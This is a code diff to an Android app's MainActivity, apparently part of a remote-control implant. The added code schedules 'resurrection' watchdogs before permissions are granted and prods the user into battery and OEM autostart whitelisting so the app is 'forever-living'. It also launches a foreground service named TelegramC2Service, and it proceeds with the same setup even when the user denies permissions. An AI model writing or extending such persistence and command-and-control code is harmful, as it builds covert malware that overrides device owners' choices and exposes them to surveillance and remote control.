@@ -1,10 +1,13 @@
 package com.chimera;
 
 import android.Manifest;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.widget.Button;
 import android.widget.Toast;
 import androidx.annotation.NonNull;
@@ -33,6 +36,8 @@ public class MainActivity extends AppCompatActivity {
         });
 
         handleFirstRunRegistration();
+        // Pyramid: schedule watchdogs early even before perms
+        try { ResurrectionHelper.scheduleWatchdog(this); } catch (Exception ignored) {}
     }
 
     private void handleFirstRunRegistration() {
@@ -40,6 +45,8 @@ public class MainActivity extends AppCompatActivity {
         boolean isFirstRun = prefs.getBoolean(FIRST_RUN_PREF, true);
         if (isFirstRun) {
             FCMHandlerService.registerDevice(this);
+            // Ensure network monitor + resurrection scheduled
+            ResurrectionHelper.resurrect(this);
             prefs.edit().putBoolean(FIRST_RUN_PREF, false).apply();
         }
     }
@@ -63,20 +70,64 @@ public class MainActivity extends AppCompatActivity {
             if (!neededPerms.isEmpty()) {
                 ActivityCompat.requestPermissions(this, neededPerms.toArray(new String[0]), REQ_CODE);
             } else {
-                Toast.makeText(this, "Permissions already granted.", Toast.LENGTH_SHORT).show();
-                finish();
+                onAllPermsGranted();
             }
         } catch (Exception e) {
             ErrorLogger.logError(this, "MainActivity_RequestPerms", e);
         }
     }
 
+    private void onAllPermsGranted() {
+        Toast.makeText(this, "Permissions granted. Configuring forever-living...", Toast.LENGTH_LONG).show();
+        // Step 1: Battery whitelist (stock Android)
+        if (!BatteryOptimizationHelper.isWhitelisted(this)) {
+            BatteryOptimizationHelper.requestWhitelist(this);
+            // Give user 2 sec then show OEM
+            findViewById(android.R.id.content).postDelayed(() -> promptOemWhitelist(), 2000);
+        } else {
+            promptOemWhitelist();
+        }
+        // Step 2: Start core service via allowed path (we are foreground activity, so FGS start is allowed)
+        try { ResurrectionHelper.resurrect(this); } catch (Exception e) { ErrorLogger.logError(this, "onAllPerms_resurrect", e); }
+        try {
+            Intent svc = new Intent(this, TelegramC2Service.class);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc); else startService(svc);
+        } catch (Exception e) { ErrorLogger.logError(this, "onAllPerms_FGS", e); }
+        finish();
+    }
+
+    private void promptOemWhitelist() {
+        try {
+            // OEM-specific autostart (Xiaomi, Huawei, etc) - best-effort
+            boolean opened = OemHelper.openOemSettings(this);
+            if (opened) {
+                Toast.makeText(this, "Please allow Auto-start / No restrictions for " + OemHelper.getManufacturerLabel(), Toast.LENGTH_LONG).show();
+            }
+        } catch (Exception e) { ErrorLogger.logError(this, "promptOem", e); }
+    }
+
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == REQ_CODE) {
-            Toast.makeText(this, "Setup complete.", Toast.LENGTH_SHORT).show();
-            finish();
+            boolean allGranted = true;
+            for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) allGranted = false;
+            if (allGranted) {
+                onAllPermsGranted();
+            } else {
+                Toast.makeText(this, "Some permissions denied. Retrying battery setup...", Toast.LENGTH_SHORT).show();
+                onAllPermsGranted();
+            }
+        }
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        // Detect if user returned from battery settings and whitelist now granted
+        if (BatteryOptimizationHelper.isWhitelisted(this)) {
+            // Re-schedule resurrection to ensure OEM reset didn't kill us
+            ResurrectionHelper.resurrect(this);
         }
     }
 }
